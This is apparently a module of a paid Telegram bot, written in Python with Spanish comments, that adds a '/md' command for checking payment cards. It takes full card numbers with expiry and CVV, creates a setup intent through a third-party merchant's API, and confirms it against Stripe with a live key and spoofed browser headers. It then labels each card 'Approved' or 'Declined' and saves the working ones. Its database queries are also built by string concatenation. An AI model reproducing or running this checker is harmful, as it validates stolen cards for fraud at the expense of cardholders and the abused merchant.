import json
import requests
import time
import asyncio
import re
import os
import colored 
import mysql.connector
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*
from values import *

# Establece los detalles de la conexión


# Establece los detalles de la conexión
# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["md"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>Comando</i> <i>/md</i>
<i>Formato:</i> <code>cc|mm|yy|cvv</code>
<i>Gateway:</i> <code>MedellinAuth</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 0)  # Redondear a 2 decimales
           
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 1)  # Redondear a 2 decimales
            await reply.edit_text(f"""<b>⎚Gateway| Medellin Auth
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
  

            url = 'https://api.switcherstudio.com/api/StripeIntents/SetupIntent'
            headers = {
    'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Origin': 'https://dashboard.switcherstudio.com',
    'Pragma': 'no-cache',
    'Referer': 'https://dashboard.switcherstudio.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Accept-Encoding': 'gzip',
}
            response = requests.get(url, headers=headers)



            decoded_response = response.text
            result = json.loads(decoded_response)
            id = result['id']
            id2 = result['client_secret']
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 1)  # Redondear a 2 decimales
            
            await reply.edit_text(f"""<b>⎚Gateway | Medellin Auth
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")



            url = 'https://api.stripe.com/v1/setup_intents/' + id + '/confirm'
            
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'accept-encoding': 'gzip',
}
            data = {
    'return_url': 'https://dashboard.switcherstudio.com/getting-started?planId=SSMO49&isTrialing=true',
    'payment_method_data[type]': 'card',
    'payment_method_data[card][number]': cc,
    'payment_method_data[card][cvc]': cvv,
    'payment_method_data[card][exp_year]': ano,
    'payment_method_data[card][exp_month]': mes,
    'payment_method_data[billing_details][address][country]': 'GT',
    'payment_method_data[pasted_fields]': 'number',
    'payment_method_data[payment_user_agent]': 'stripe.js/d749fa7cbc;+stripe-js-v3/d749fa7cbc;+payment-element',
    'payment_method_data[time_on_page]': '117212',
    'payment_method_data[guid]': '68470569-0cea-40fa-b2b8-bedce477f3f76d9ef1',
    'payment_method_data[muid]': '3e6cc132-16c4-47fe-a259-e46e39bd48db2d2e5e',
    'payment_method_data[sid]': 'cd73ec66-9eb9-441a-92cf-24c5323dada44e5f5d',
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_4M6W94FIwtPtRw97OP9aadh8',
    'client_secret': id2,
}
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 1)  # Redondear a 2 decimales    
            result2 = requests.post(url, headers=headers, data=data)
            print(result2.text)
            
               
            await reply.edit_text(f"""<b>⎚Gateway | Medellin Auth
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")
                
                
                
            if 'succeeded' in result2.text:
              status = "Approved✅"
              msg = "Succeeded"
              save_live(ccs)
            elif 'insufficient_funds' in result2.text:
              status = "Approved✅"
              msg = "insufficient funds"
            elif 'incorrect_cvc' in result2.text:
              status = "Approved CVV✅"
              msg = "CHARGED CVV 5$"
            elif 'transaction_not_allowed' in result2.text:
              status = "Decined❌"
              msg = "transaction not allowed"
            elif 'do_not_honor' in result2.text:
              status = "Declined❌"
              msg = "Do Not Honor"
            elif 'stolen_card' in result2.text:
              status = "Declined❌"
              msg = "stolen card"
            elif 'lost_card' in result2.text:
              status = "Declined❌"
              msg = "lost_card"
            elif "pickup_card" in result2.text:
                status = "Declined❌"
                response = "Pickup Card"
            elif "incorrect_number" in result2.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
            elif "expired_card" in result2.text:
                status = "Declined❌"
                msg = "Expired Card"
            elif "generic_decline" in result2.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "fraudulent" in result2.text:
                status = "Declined❌"
                msg = "Fraudulent"
            elif "lock_timeout" in result2.text:
                status = "Declined❌"
                msg = "Api Error"
            elif "Your card was declined." in result2.text:
                status = "Declined❌"
                msg = "Generic Decline"
            elif "intent_confirmation_challenge" in result2.text:
                status = "Declined❌"
                msg = "Captcha"
            elif "Your card does not  support this type of purchase." in result2.text:
                status = "Live 🟡"
                msg = "Locked Card"
            elif "parameter_invalid_empty" in result2.text:
                status = "Declined❌"
                msg = "404 error"
            elif "invalid_request_error" in result2.text:
                status = "Declined❌"
                msg = "404 error"
            
            else:
                status = "Declined❌"
                msg = "Gate Dead"
              
            await reply.edit_text(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Medellin Auth
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)
            
